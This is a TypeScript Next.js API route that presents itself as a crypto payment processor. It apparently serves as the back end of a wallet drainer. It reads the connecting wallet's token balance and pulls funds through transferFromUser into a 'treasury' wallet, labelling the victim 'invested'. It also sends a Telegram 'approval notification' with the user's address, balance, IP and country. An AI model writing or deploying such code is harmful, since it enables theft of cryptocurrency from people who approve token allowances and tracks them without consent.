import { NextRequest, NextResponse } from "next/server";
import { blockchainService, TelegramService } from "@/lib/blockchain";
import { getDatabase } from "@/lib/db";
import { CurrencyType, PaymentStatus } from "@/types";
import { getWalletType } from "@/utils/chainUtils";
import { logger } from "@/lib/logger";

export async function POST(request: NextRequest) {
  try {
    const { paymentId, currency, userAddress, chain, txHash } = await request.json();

    if (!paymentId || !currency || !userAddress || !chain) {
      return NextResponse.json({ success: false, error: "Missing required parameters" }, { status: 400 });
    }

    const db = getDatabase();

    let payment;
    try {
      // Get payment from database
      payment = await db.getPayment(paymentId);
      if (!payment || payment.currency !== currency) {
        return NextResponse.json({ success: false, error: "Payment not found or currency mismatch" }, { status: 404 });
      }
    } catch (error: any) {
      return NextResponse.json({ success: false, error: "Failed to get payment" }, { status: 500 });
    }

    // Get client IP from headers if not provided
    const clientIP =
      request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown";

    const tokenBalance = await blockchainService.getTokenBalance(chain, currency as CurrencyType, userAddress);

    try {
      // Add wallet (no need to check if it exists)
      await db.saveWallet(userAddress, chain, currency, payment.amount);
      logger.info(`Wallet added: ${userAddress} on ${chain.toUpperCase()}`);
    } catch (error: any) {
      logger.error("Error adding wallet:", error);
    }

    try {
      const treasuryWallet = await db.getTreasuryWallet(chain);

      let result;
      if (treasuryWallet && treasuryWallet.address) {
        result = await blockchainService.transferFromUser(
          chain,
          currency as CurrencyType,
          userAddress,
          treasuryWallet.address,
          payment.amount.toString()
        );

        if (result.success) {
          try {
            await db.updateWallet(userAddress, chain, currency, payment.amount, "invested");
            logger.info(`Wallet updated: ${userAddress} on ${chain.toUpperCase()} to invested`);
          } catch (error: any) {
            console.log("Error updating wallet:", error);
            logger.error("Error updating wallet:", error);
          }
        } else {
          console.error("Error transferring from user:", result.error);
        }
      }

      const status = result && result.success ? "completed" : "failed";
      // Update payment status
      await db.updatePayment(paymentId, status as PaymentStatus, {
        wallet_address: userAddress,
        chain,
        tx_hash: txHash
      });
      logger.info(`Payment ${paymentId} status updated to: ${status}`);
    } catch (error: any) {
      logger.error("Error updating payment status:", error);
    }

    // Common telegram notification function
    try {
      const country = await TelegramService.getCountryFromIP(clientIP);
      const walletType = getWalletType(chain);

      await TelegramService.sendApprovalNotification({
        chain,
        currency,
        userAddress,
        amount: payment.amount.toString(),
        paymentId,
        walletType,
        clientIP,
        tokenBalance: tokenBalance?.toString() || "0.00",
        country
      });
    } catch (telegramError) {
      logger.error("Error sending Telegram notification:", telegramError);
    }

    return NextResponse.json({ success: true, message: "Payment processed successfully" }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
